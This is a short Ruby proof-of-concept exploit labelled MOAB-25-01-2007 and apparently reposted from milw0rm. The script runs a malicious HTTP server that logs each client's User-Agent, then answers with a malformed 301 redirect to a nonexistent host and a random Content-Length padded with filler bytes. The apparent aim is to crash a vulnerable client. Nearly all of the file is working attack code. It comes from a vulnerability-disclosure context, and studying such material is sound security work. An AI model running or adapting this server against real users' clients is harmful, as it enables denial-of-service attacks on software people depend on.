#!/usr/bin/ruby
# (c) Copyright 2007 Lance M. Havok <lmh [at] info-pull.com>
# Proof of concept for MOAB-25-01-2007.
#

require 'socket'

web_port = (ARGV[0] || 80).to_i

puts "++ Starting HTTP server at port #{web_port}."
web_server  = TCPServer.new(nil, web_port)
while (session = web_server.accept)
  rand_clen = rand(80)
  useragent = session.recvfrom(2000)[0].scan(/User-Agent: (.*)/).flatten[0].chomp!
  puts "++ Connected: #{useragent}"
  session.print "HTTP/1.1 301 OK\r\n"
  session.print "Content-Type: text/html\r\n"
  session.print "Content-Length: #{rand_clen}\r\n"
  session.print "Location: http://nonexistent123\r\n\r\n"
  session.print "X" * rand_clen
  session.close
end

# milw0rm.com [2007-01-25]
